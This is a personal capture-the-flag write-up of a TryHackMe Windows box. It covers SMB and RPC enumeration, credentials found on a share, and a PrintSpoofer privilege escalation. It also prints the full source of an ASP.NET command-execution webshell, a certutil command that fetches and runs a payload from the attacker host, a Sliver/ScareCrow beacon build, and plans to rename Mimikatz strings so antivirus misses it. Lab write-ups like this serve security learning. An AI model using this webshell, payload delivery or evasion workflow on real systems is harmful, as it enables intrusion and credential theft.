# Relevant WTFisTHIS

Name: Relevant
Date:  11/1/2024
Difficulty:  Medium
Goals:  
- Finish Offensive Path on THM 
- AV Evade 
- Evade internet restrictions eating patience 
Learnt:
- I am jaded
- Some boxes are just odd
Beyond Root:

- [[Relevant-Notes.md]]
- [[Relevant-CMD-by-CMDs.md]]

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![](TryHackMe/Markdown/Relevant/Screenshots/ping.png)

I had lots of scanning issues with this machine.
![](noudp.png)

These issue make the ordering and explanation of screenshots more convoluted. The recon phase really had some issues with services being filtered after connections. I later concluded it has some defensive mechanisms. The annoyingly `-sS` is not that much stealthier, but just takes longer. It performs a very obvious pattern of attempted connections that even I could recognise as `nmap -sS`.

Point of Self-Reflection:
- When the box says **blackbox and all tools and any techniques**, just go full cyber do not treat it like a pentest you are only wasting your time. 
- "Stealthy" to some is on a scale and the annoying arbitrariness of that is probably true in the real world. I just think that is  

On - 4th time attempting this machine point I wanted to see if this machine and author are going to waste more of my time learning in the most stupid way possible is just someone idea of enjoy the *"interpretation of my learning* affect how I grade myself as to if I solved some percentage of this machine. 
![](justwhy.png)

Why should a python3 threaded script be more stealthy than masscan or nmap 

RDP:
![](anotherrestartlatertocheckifthecertisatools.png)

I started clucking at straws given how network connection to this machine was over multiple.  
![](certchecking.png)


![](wtfisgoingonwiththismachine.png)

After I had got the passwords.txt, this writeup will be a jumbled as my mind on the attempt just o communicate with it were.
![](validpassword.png)
Checking SMB as this box behaved so weirdly.
![](smbparanoid.png)
No zero auth rpcclient
![](rpcclientnozeroauth.png)

crackmapexec:
![](cmethistime.png)

passwords.txt
```bash
echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
Bob - !P@$$W0rD!123

echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

![](cmesmbbuild.png)
![](cmerid.png)


Bob can connect to RPC:
![](bobspassword.png)

Running all of my cheatsheets worth of rpc the first time
![](bobisrpcclientstacked.png)

Bill cannot connect to RPC
![](billspassword.png)
![](billrpcfailedauth.png)

Why is it on this port?
![](becausewhy49663.png)


Returning to this machine after about 3-4 restarts and re-scanning nightmare that this machine was, guest can also login was `smbclient` and `get` the passwords.txt file. We can also write to this share.
![](smbclienttopasswords.png)

Either the passwords from this share will grant us access via another service and as far as I very acutely aware of testing every service I will just retread my steps to verify what can I can do with these passwords

`cme` is still broken for python 3.11. My hopes are that `mojo`, which will replace python will end the insane continuous breaking of something every python minor and major version patch. ![](cmeisbrokenforrdp311.png)

Maybe I am just way too young but bash just works, Golang just works, PowerShell works albeit weirdly some versions. Python has serious problems that I know I am very biased against JavaScript. Looking forward to `mojo` being more prevalent .
![](thencmejustbreaks.png)

![](ssstealthscanning.png)

Then 
![](falsefalsepostivespostiVESARGH.png)

Proof that Bill is not a honeypot account, but there must be some defensive mechanisms present at the network level.
![](proofthatBillisnotahoneypotaccount.png)

With all the re-re-re-re-re-returning eyebrow raising this box has induced. RPC the only way. HTTP   could be behind `:49663/aspnet_client/` 

Running all of my cheatsheets worth of rpc the second time
```powershell
rpcclient -U bob 10.10.177.186
Password for [WORKGROUP\bob]:
rpcclient $> querydispinfo
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> srvinfo
        10.10.177.186  Wk Sv NT SNT
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9003
rpcclient $> lookupdomain RELEVANT
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> lookupdomain RELEVANT.thm
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> querydominfo
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> enumalsgroups builtin
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> enumdomgroups
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> netshareenum
result was WERR_ACCESS_DENIED
rpcclient $> netshareenumall
result was WERR_ACCESS_DENIED
rpcclient $> netsharegetinfo Confidential
result was WERR_ACCESS_DENIED
rpcclient $> querygroup 500
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> querygroup 1000
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> querygroup 1001
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> querygroup 1002
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser bill
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser Bob
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser
Usage: queryuser rid [info level] [access mask]
rpcclient $> queryuser 1003
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser 1002
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser 1001
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser 500
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser 500 1
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
rpcclient $> getdompwinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> getdompwinfo 1000
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> getdompwinfo 1001
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> getdompwinfo 500
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> createdomuser hacker
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> lookupnames bill
result was NT_STATUS_NONE_MAPPED
rpcclient $> lookupnames bob
bob S-1-5-21-3981879597-1135670737-2718083060-1002 (User: 1)
rpcclient $> lookupnames administrator
administrator S-1-5-21-3981879597-1135670737-2718083060-500 (User: 1)
rpcclient $> lookupnames Bill
result was NT_STATUS_NONE_MAPPED
rpcclient $> lsaaddacctrights S-1-5-21-3981879597-1135670737-2718083060-1002 SeCreateTokenPrivilege
result was NT_STATUS_ACCESS_DENIED
rpcclient $> saenumprivsaccount S-1-5-21-3981879597-1135670737-2718083060-1002
command not found: saenumprivsaccount
rpcclient $> lsaenumprivsaccount S-1-5-21-3981879597-1135670737-2718083060-1002
result was NT_STATUS_OBJECT_NAME_NOT_FOUND
rpcclient $> enumdomgroups
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> lsaquery
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
rpcclient $> queryuser 1002
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> lsaquerysecobj 1002
revision: 1
type: 0x8000: SEC_DESC_SELF_RELATIVE
        Group SID:      S-1-5-18
rpcclient $> queryuser bob
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser bill
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser administrator
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser none
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> queryuser guest
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> getdompwinfo
result was NT_STATUS_CONNECTION_DISCONNECTED
```

The Bill account is disabled
![](billisdisabled.png)

I saw something requiring Kerberos while waiting for the stealth rererescan so I tried getting a TGT for Bob 
![](checkingifkrbwasactuallytheregivenportscanning.png)

Reconsidering my rcpclient cheatsheet is not great and this probably not a DC or a real AD domain.
![](rpcclientproof.png)

Well at least I am not going to be irrelevant I suppose.
![](morepainmorepain.png)

We have SMB read/write... v1 and is not signed...
![](isthisjusteternalblue.png)

After some considerations and various attempt. I have had too much time with this room to the point of frustration over multiple years returning. The network connective was absurd. This box is actually absurdly easy. The contextual I have changed this machine to WTFisTHIS, because after skipping to what next to do in the official video and him just browsing to the web page first time. Like the last 5 months meant nothing, same the as the year before... 

... 
## Exploit

WE can just upload a webshell to the http server running on port 49663.... 
![](loopdelooping.png)

![](hurray.png)

## Foothold

Sharing my shoes with someone again. This was doctored. I used a `nc` because low hanging fruit O'clock on 443. Must have been brown trousers new year's eve. Just because a manager would probably confidentially laugh at me on this one. Amusing I do not need proof to share, but this still needs to be here. I also need to actually learn stuff so could you at least use your own call to you the `nc`i uploaded like its 2018. 

![1080](netstatyourmindintothewtf.png)

40[.]127[.]240[.]158 and 40[.]68[.]123[.]157 - For using my port go burn your stuff. And your fancy update.microsoft dns names, could you at least use another port I am barely capable at turning on the computer. Can you not just buy a subscription and pretend to be someone if you can afford to waste my time - I need my time. Also is this not crazy sloppy and cant you just rent a servers in some random country? I probably wont even make the same money spent to bother me in my lifetime that you wasted on being this bad that I found you. Worst of all it is gonna take I now need to go baseline loads of of Windows Server to check how many of them have this insanely open network configuration. And I can barely get on this server. Have you not better things to do? You can respond character by character at a time with pictures really prove those hours argue value of clocking in those hours.  

![](admininthebin.png)

```
certutil.exe -urlcache -split -f http://10.11.3.193/outlook.exe C:\programdata\outlook.exe


start "Tutil-msSRV - Important Test" /d C:\programdata\outlook.exe  /b /high /wait 

```

While everything dies I at least managed to write the word hello to `c:\programdata\test.txt`
![](waitingsotestahello.png)

Having to check every shoelace, PowerShell does work this time.... 
![](powershelldoeswork.png)

![](doublecheckingpsexec.png)

![](wehaveav.png)


![](mshtafail.png)

There is AV on the box eating my binaries and being generally bad for my footholding


## AV Evasion - The Real Beyond Root Begins here 

And I do not even have to start the machine to have fun... or use the internet to do that much.

- Binary patch something with shellcode
- Automate the AV evasion - think about it
- Shellter a sliver binary - Sliver binary are so large this is just laughable 
- Mimikatz manually consider how an application would do this and cool ideas

- C sharp stager to sliver beacon

IDEAS
- All filename names for:
	- modules
- Remove all comments after replace just to have some chunk and so it does not look very stripped
- Add comments:
- AI generate conversation in comments 
	- `This need fucking fixed {X person}`
	- `WTF does this do {Y person}`
- AI generate junk descriptions
- Remove all frenchness ` coffee =kdbg_coffee`, replace with getTheNuts c stdout silly file 
- Add Junk code that will never be called
- Add some encrypted to add to entropy but not be a significant percentage
- Or be cool and: 
	- encrypt all the calls
	- Add a function  decrypt and then run them
	-  Encrypt all of the 

What I would need to do to make the golang app 
```go 

// Directories to remove
// all files to a temporary directory

// For all Source files
	// enum for language has these files - ATSOMEPOINT
	// enum for keywords,etc of the language - KWOLX
	// strings | uniq
	// gurl -v all KWOLX (do not remove line, and then split everything
	// uniq everything again 
	// buffer into TARGETSmap and FANCYmap(int id int propindex) (word string  tranformto string,  string linenumbers int count, entrpy! string   ) -fanacy map 
	// generate a file that is dictionary of what is transform to what with dictionary TARGETmap 

	// modfiy files 

```

- Finish my gurl project add:
	- do not remove line
	- `-v` exclude option

#### Let the AV arms race commence 

Attempt 1 

![](attemptone-src.png)
![](upxtherevC.png)
![](compiledproof-somedebugfixed.png)
![](attempt1-basicshellcode.png)
![](narcissismisalwaysbad.png)



![](PROGRESS.png)

Double checking with
![](puttybadbecause2yearsagoitwasbadbuthey.png)



![](tearsthatarerelevant.png)

![](defensesagain.png)

- Ideas 
	- Download Relevant's `C:\Windows\System32\kernel32.dll`


And with a great name!
![](ExcelIsTheMathematicalDockWhatAName.png)

Run Seatbelt for late and check that this actually is not just a rug pull. Interactive broke. Not sure if it was seatbelt.
![](atleast2minstesting-interactive-broke.png)

```
generate beacon --mtls  10.11.3.193:445 --arch amd64 --os windows --save /tmp/445-sliver.bin -f shellcode -G

/opt/ScareCrow/ScareCrow -I /tmp/445-sliver.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
# Build with golang
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
# Pack with upx
upx $file.exe

```

#### Could not manage to execute the exact same thing

WTF is this machine. Lets AV with msfvenom in 2023 and be humbled into the crater of humility on this one.
![](learnintomsfvenom.png)
## Privilege Escalation To NT System

Another SeImpersonate Privilege Escalation to whine about. This time I watch the video to understand what I was going wrong from the various Proving Ground boxes of late 2023. This is actually it:
```powwershell
.\printspoofer.exe -i -c cmd
```

![](root.png)
## Post-Root-Reflection  

- Sometimes it is not you 
- Sometimes the boxes are robot.txt levels of WTF.
- FINALLY ALL SeImpersonate boxes will aGAIN BE MINE!!!
- Sometimes boxes are of there time
- msfvenom is still worth considering.
## Beyond Root

Update my rpc cheatsheet
- https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
- https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

powershell
- https://www.ired.team/offensive-security/code-execution/powershell-without-powershell
- https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass

IIS 
- https://stackify.com/w3wp-exe-iis-worker-process/

upx --ultra
- https://sibprogrammer.medium.com/go-binary-optimization-tricks-648673cc64ac

- https://black.vercel.app/ python formatter

Note - Nothing in this room requires Metasploit

Learn some ASP - does not work,  just powershell does not work
```asp
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg_cmd.Text)));
Response.Write("</pre>");
}
string ExcutePWSH(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "powershell.exe";
psi.Arguments = "-ep bypass -windowstyle hidden -command {"+arg+" }";
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void pwshExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcutePWSH(txtArg_pwsh.Text)));
Response.Write("</pre>");
}
string ExcuteCmdSE(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = true;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_SE_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmdSE(txtArg_cmd_se.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen + 7ru7h asp.net webshell</title>
</HEAD>
<body>
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg_cmd" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing_cmd" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="cmd.exe" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText_cmd" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Execute cmd /c without ShellExec - good for commands:</asp:Label>
</form>
<form id="powershell" method="post" runat="server">
<asp:TextBox id="txtArg_pwsh" style="Z-INDEX: 201; LEFT: 405px; POSITION: absolute; TOP: 40px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing_pwsh" style="Z-INDEX: 202; LEFT: 675px; POSITION: absolute; TOP: 36px" runat="server" Text="powershell.exe" OnClick="pwshExe_Click"></asp:Button>
<asp:Label id="lblText_pwsh" style="Z-INDEX: 203; LEFT: 310px; POSITION: absolute; TOP: 44px" runat="server">Execute PowerShell:</asp:Label>
</form>
<form id="cmd_se" method="post" runat="server">
<asp:TextBox id="txtArg_cmd_se" style="Z-INDEX: 301; LEFT: 405px; POSITION: absolute; TOP: 60px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing_cmd_se" style="Z-INDEX: 302; LEFT: 675px; POSITION: absolute; TOP: 54px" runat="server" Text="cmd.exe ShellExec" OnClick="cmdExe_SE_Click"></asp:Button>
<asp:Label id="lblText_cmd_se" style="Z-INDEX: 303; LEFT: 310px; POSITION: absolute; TOP: 66px" runat="server">Execute cmd.exe /c with UseShellExecute:</asp:Label>
</form>
</body>
</HTML>

<!-- "Improvements" by 7ru7h and Phind model for button position guessing--->
<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
```


#### Mimikatz

#### List the words to replace in order across all files 

- All filename names for:
	- modules


Remove all comments after replace just to have some chunk and so it does not look very stripped

- Add comments:
- AI generate conversation in comments 
	- `This need fucking fixed {X person}`
	- `WTF does this do {Y person}`
- AI generate junk descriptions

- Remove all frenchness ` coffee =kdbg_coffee`, replace with getTheNuts c stdout silly file 

Replace in mimikatz.c
```
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/

		L"  .#####.   " MIMIKATZ_FULL L"\n"
		L" .## ^ ##.  " MIMIKATZ_SECOND L" - (oe.eo)\n"
		L" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		L" ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n"
		L" '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n"
		L"  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n");

POWERKATZ

mimikatz

MIMIKATZ

powershell

POWERSHELL

```


miimlib
- dll renames

```
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com

	Vincent LE TOUX
	http://pingcastle.com / http://mysmartlogon.com
	vincent.letoux@gmail.com

	Licence : https://creativecommons.org/licenses/by/4.0/
*/


Password
Domain
CREDENTIALS
CREDENTIAL
Credential
Authentication
Authenticate
AUTHENT

// ksub.c
const BYTE myHash[LM_NTLM_HASH_LENGTH] = {0xea, 0x37, 0x0c, 0xb7, 0xb9, 0x44, 0x70, 0x2c, 0x09, 0x68, 0x30, 0xdf, 0xc3, 0x53, 0xe7, 0x02}; // Waza1234/admin

Authent

KIWI

// AFTER FULL WORDS
CRED
Cred

kiwi

Kiwi
LOGON_SESSION
LogonSession

Lsass



	PackageInfo->Name       = L"KiwiSSP";
	PackageInfo->Comment    = L"Kiwi Security Support Provider";

const wchar_t * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
	L"UndefinedLogonType",
	L"Unknown !",
	L"Interactive",
	L"Network",
	L"Batch",
	L"Service",
	L"Proxy",
	L"Unlock",
	L"NetworkCleartext",
	L"NewCredentials",
	L"RemoteInteractive",
	L"CachedInteractive",
	L"CachedRemoteInteractive",
	L"CachedUnlock",
};
```

Add Junk code that will never be called

Add some encrypted to add to entropy but not be a significant percentage

Or be cool and: 
- encrypt all the calls
- Add a function  decrypt and then run them
-  Encrypt all of the 

mimilove
```

	kprintf(L"\n"
		L"  .#####.   " MIMILOVE_FULL L"\n"
		L" .## ^ ##.  " MIMILOVE_SECOND L"\n"
		L" ## / \\ ##  /* * *\n"
		L" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		L" '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)\n"
		L"  '#####'    " MIMILOVE_SPECIAL L"* * */\n\n");

kull
kuhl


mimilove
love
LOVE

lsasrv
kerberos

	kprintf(L"========================================\n"
		L"LSASRV Credentials (MSV1_0, ...)\n"
		L"========================================\n\n"
		);


Kiwi
LOGON_SESSION
LogonSession

sekurlsa

VeryBasicModuleInformationsForName


miKerberos 
paKerberos
KerbLogonSessionList

PKERB_HASHPASSWORD_5
KERBEROS_KEYS_LIST_5
KERB_HASHPASSWORD_5
KIWI_KERBEROS_KEYS_LIST_5


PCWCHAR mimilove_kerberos_etype(LONG eType)
{
	PCWCHAR type;
	switch(eType)
	{
	case KERB_ETYPE_NULL:							type = L"null             "; break;
	case KERB_ETYPE_DES_PLAIN:						type = L"des_plain        "; break;
	case KERB_ETYPE_DES_CBC_CRC:					type = L"des_cbc_crc      "; break;
	case KERB_ETYPE_DES_CBC_MD4:					type = L"des_cbc_md4      "; break;
	case KERB_ETYPE_DES_CBC_MD5:					type = L"des_cbc_md5      "; break;
	case KERB_ETYPE_DES_CBC_MD5_NT:					type = L"des_cbc_md5_nt   "; break;
	case KERB_ETYPE_RC4_PLAIN:						type = L"rc4_plain        "; break;
	case KERB_ETYPE_RC4_PLAIN2:						type = L"rc4_plain2       "; break;
	case KERB_ETYPE_RC4_PLAIN_EXP:					type = L"rc4_plain_exp    "; break;
	case KERB_ETYPE_RC4_LM:							type = L"rc4_lm           "; break;
	case KERB_ETYPE_RC4_MD4:						type = L"rc4_md4          "; break;
	case KERB_ETYPE_RC4_SHA:						type = L"rc4_sha          "; break;
	case KERB_ETYPE_RC4_HMAC_NT:					type = L"rc4_hmac_nt      "; break;
	case KERB_ETYPE_RC4_HMAC_NT_EXP:				type = L"rc4_hmac_nt_exp  "; break;
	case KERB_ETYPE_RC4_PLAIN_OLD:					type = L"rc4_plain_old    "; break;
	case KERB_ETYPE_RC4_PLAIN_OLD_EXP:				type = L"rc4_plain_old_exp"; break;
	case KERB_ETYPE_RC4_HMAC_OLD:					type = L"rc4_hmac_old     "; break;
	case KERB_ETYPE_RC4_HMAC_OLD_EXP:				type = L"rc4_hmac_old_exp "; break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96_PLAIN:	type = L"aes128_hmac_plain"; break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96_PLAIN:	type = L"aes256_hmac_plain"; break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:		type = L"aes128_hmac      "; break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:		type = L"aes256_hmac      "; break;
	default:										type = L"unknow           "; break;
	}
	return type;
}
```

```
LM_NTLM_HASH
LSA_
Tickets
VERY_BASIC_MODULE_INFORMATION
PKULL_M_MINI_PATTERN
```